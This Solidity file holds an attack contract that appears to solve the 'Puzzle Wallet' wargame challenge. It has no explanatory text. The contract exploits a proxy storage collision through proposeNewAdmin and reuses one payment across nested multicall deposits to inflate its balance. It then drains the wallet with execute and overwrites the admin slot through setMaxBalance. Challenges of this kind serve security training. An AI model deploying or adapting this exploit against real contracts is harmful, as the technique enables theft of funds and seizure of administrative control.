// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IPuzzleProxy.sol";
import {Test, console} from "forge-std/Test.sol";

contract PuzzleWalletAttack {
    IPuzzleProxy target;

    constructor(address payable _target) {
        target = IPuzzleProxy(_target);
    }

    function run() public payable {
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
    
        uint256 numberOfIterations = (address(target).balance / msg.value) + 1;
        require(target.maxBalance() > msg.value * numberOfIterations, "MaxBalance exceeded");

        bytes[] memory data = new bytes[](numberOfIterations);

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes memory multicallData = abi.encodeWithSelector(target.multicall.selector, depositData);

        for (uint256 i = 0; i < numberOfIterations; i++) {
            data[i] = multicallData;
        }

        target.multicall{value: msg.value}(data);
        target.execute(msg.sender, numberOfIterations * msg.value, "");

        target.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
